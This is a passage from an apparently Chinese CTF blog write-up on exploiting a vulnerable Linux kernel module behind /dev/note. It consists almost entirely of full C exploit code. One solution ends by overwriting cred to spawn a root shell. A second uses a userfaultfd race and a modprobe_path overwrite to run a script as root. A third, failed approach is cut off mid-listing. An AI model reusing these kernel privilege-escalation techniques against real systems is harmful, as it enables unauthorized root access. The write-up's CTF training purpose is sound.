tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = offset ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base_offset = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base_offset);</span><br><span class="line">    page_offset_base_offset += <span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base_offset = %p\n"</span>,page_offset_base_offset);</span><br><span class="line"></span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (<span class="keyword">module</span> + <span class="number">0x169</span> + page_offset_base_offset) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base = %p\n"</span>,page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(prctl(PR_SET_NAME,<span class="string">"xiaoxiaorenwu.."</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]set name error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>;;i += <span class="number">0x100</span>)&#123;</span><br><span class="line">        tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">        tmp_buf[<span class="number">1</span>] = <span class="number">0xff</span> ^ key;</span><br><span class="line">        tmp_buf[<span class="number">2</span>] = i ^ key;</span><br><span class="line">        edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line">        memset(user_buf,'\x00',0x100);</span><br><span class="line">        show(<span class="number">2</span>,user_buf);</span><br><span class="line">        <span class="keyword">size_t</span> result = memmem(user_buf,<span class="number">0x100</span>,<span class="string">"xiaoxiaorenwu.."</span>,<span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            cred_addr = *(<span class="keyword">size_t</span>*)(result<span class="number">-8</span>);</span><br><span class="line">            real_cred_addr = *(<span class="keyword">size_t</span>*)(result<span class="number">-0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred_addr == real_cred_addr)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]cred_addr = %p\n"</span>,cred_addr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cred_addr == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]not find..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">0x20</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (cred_addr+<span class="number">4</span>-page_offset_base) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    memset(user_buf,'\x00',0x20);</span><br><span class="line">    edit(<span class="number">2</span>,user_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/17/pBgsf1aYbh2xPVc.png" alt="x1.PNG"></p>
<h2 id="解法二：-4"><a href="#解法二：-4" class="headerlink" title="解法二："></a>解法二：</h2><p>改<code>modprobe_path</code></p>
<h2 id="exp：-18"><a href="#exp：-18" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -pthread xx.c -g -o xx</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FAULT_PAGE ((void*)0x1337000)</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_chunk</span>* <span class="title">user_ptr</span>;</span></span><br><span class="line"><span class="keyword">char</span> user_buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;size = size;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff00</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]new error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff02</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">"[:(]show error..."</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff03</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]delete error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">size_t</span> index,<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    user_ptr-&gt;index = index;</span><br><span class="line">    user_ptr-&gt;buf = buf;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(fd,<span class="number">0xffffff01</span>,user_ptr) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]edit error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handle</span><span class="params">(<span class="keyword">void</span>* uffd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">mypollfd</span>;</span></span><br><span class="line"></span><br><span class="line">    mypollfd.fd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)uffd;</span><br><span class="line">    mypollfd.events = POLLIN;</span><br><span class="line">    <span class="keyword">int</span> re = poll(&amp;mypollfd,<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(re &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Catch error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]I catch it!!!"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span>();</span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">	memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line">	user_buf[<span class="number">8</span>] = <span class="number">0xf0</span>; </span><br><span class="line"></span><br><span class="line">	uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)user_buf;</span><br><span class="line">	uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)FAULT_PAGE;</span><br><span class="line">	uc.len = <span class="number">0x1000</span>;</span><br><span class="line">	uc.mode = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(ioctl(uffd,UFFDIO_COPY,&amp;uc) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]UFFDIO_COPY error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;  <span class="comment">// 恢复执行copy_from_user</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"[:)]UFFDIO_COPY done!!!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_uffd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">myapi</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">myuffd</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> pt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    myapi.api = UFFD_API;</span><br><span class="line">    myapi.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_API,&amp;myapi) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Api error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mmap(FAULT_PAGE,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>) != FAULT_PAGE)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    myuffd.range.start = FAULT_PAGE;</span><br><span class="line">    myuffd.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    myuffd.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span>(ioctl(uffd,UFFDIO_REGISTER,&amp;myuffd) == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Register error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> re = pthread_create(&amp;pt,<span class="literal">NULL</span>,handle,(<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span>(re != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Create pthread error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/note"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    memset(user_buf,'\x00',sizeof(user_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0x10</span>,user_buf); <span class="comment">//0</span></span><br><span class="line">    register_uffd();</span><br><span class="line">    edit(<span class="number">0</span>,FAULT_PAGE);</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> key = *(<span class="keyword">size_t</span>*)user_buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]key = %p\n"</span>,key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span>(<span class="number">0</span>,user_buf);</span><br><span class="line">    show(<span class="number">1</span>,user_buf);</span><br><span class="line">    <span class="keyword">size_t</span> <span class="keyword">module</span> = *((<span class="keyword">size_t</span>*)user_buf+<span class="number">2</span>) ^ key;</span><br><span class="line">    <span class="keyword">module</span> -= <span class="number">0x2568</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]module = %p\n"</span>,<span class="keyword">module</span>);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">size_t</span>* tmp_buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="keyword">module</span> + <span class="number">0x165</span>;</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = offset ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base_offset = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base_offset);</span><br><span class="line">    page_offset_base_offset += <span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base_offset = %p\n"</span>,page_offset_base_offset);</span><br><span class="line"></span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">8</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (<span class="keyword">module</span> + <span class="number">0x169</span> + page_offset_base_offset) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> page_offset_base = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;page_offset_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]page_offset_base = %p\n"</span>,page_offset_base);</span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------------</span></span><br><span class="line">    offset = <span class="keyword">module</span> + <span class="number">0x1cd</span>;</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">4</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = offset ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line">    prctl(PR_SET_NAME,<span class="string">"xiaoxiaorenwu.."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> copy_to_user_offset = <span class="number">0</span>;</span><br><span class="line">    show(<span class="number">2</span>,&amp;copy_to_user_offset);</span><br><span class="line">    copy_to_user_offset += <span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]copy_to_user_offset = %p\n"</span>,copy_to_user_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> kernel_base = <span class="keyword">module</span> + page_offset_base + copy_to_user_offset + <span class="number">0x1d1</span> - <span class="number">0x353ee0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]kernel_base = %p\n"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ffffffff8205e0e0 D modprobe_path</span></span><br><span class="line">    <span class="keyword">size_t</span> modprobe_path = kernel_base + (<span class="number">0xffffffff8205e0e0</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">    tmp_buf[<span class="number">0</span>] = <span class="number">0</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">1</span>] = <span class="number">9</span> ^ key;</span><br><span class="line">    tmp_buf[<span class="number">2</span>] = (modprobe_path-page_offset_base) ^ key;</span><br><span class="line">    edit(<span class="number">1</span>,tmp_buf);</span><br><span class="line">    <span class="built_in">strcpy</span>(user_buf,<span class="string">"/xxrw.sh"</span>);</span><br><span class="line">    edit(<span class="number">2</span>,user_buf);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /xxrw.sh"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"</span>);</span><br><span class="line">    system(<span class="string">"/bin/chmod +x /trigger"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]trigger!!!"</span>);</span><br><span class="line">    system(<span class="string">"/trigger"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/17/2RwiMIBSAPTsy1t.png" alt="x1.PNG"></p>
<h2 id="解法三：-1"><a href="#解法三：-1" class="headerlink" title="解法三："></a>解法三：</h2><p><code>poweroff_cmd</code> &amp;&amp; <code>prctl.hook</code></p>
<p>失败，貌似改不了<code>prctl.hook</code>。</p>
<h2 id="exp：-19"><a href="#exp：-19" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 